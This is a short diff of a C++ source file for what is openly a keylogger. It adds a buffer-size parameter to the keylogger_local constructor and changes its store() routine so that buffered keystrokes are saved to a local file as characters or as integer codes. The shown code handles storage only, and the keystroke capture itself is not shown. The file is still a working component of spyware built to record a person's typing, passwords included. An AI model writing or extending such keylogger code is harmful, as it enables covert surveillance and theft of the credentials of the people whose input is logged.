@@ -1,7 +1,7 @@
 #include "./keylogger_local.hpp"
 
-keylogger_local::keylogger_local(string p_destination_path) :
-		keylogger()
+keylogger_local::keylogger_local(size_t p_buffer_size, string p_destination_path) :
+		keylogger(p_buffer_size)
 {
 	a_ofstream = new ofstream();
 
@@ -18,7 +18,13 @@ keylogger_local::~keylogger_local()
 
 void keylogger_local::store()
 {
-	*a_ofstream << *a_buffer << endl;
+	if(a_store_character == true)
+		*a_ofstream << *a_buffer << endl;
+	else
+		for (int index = 0; (*a_buffer)[index] != '\0'; index++)
+		{
+			*a_ofstream << (int) a_buffer->at(index) << endl;
+		}
 
 	a_ofstream->flush();
 
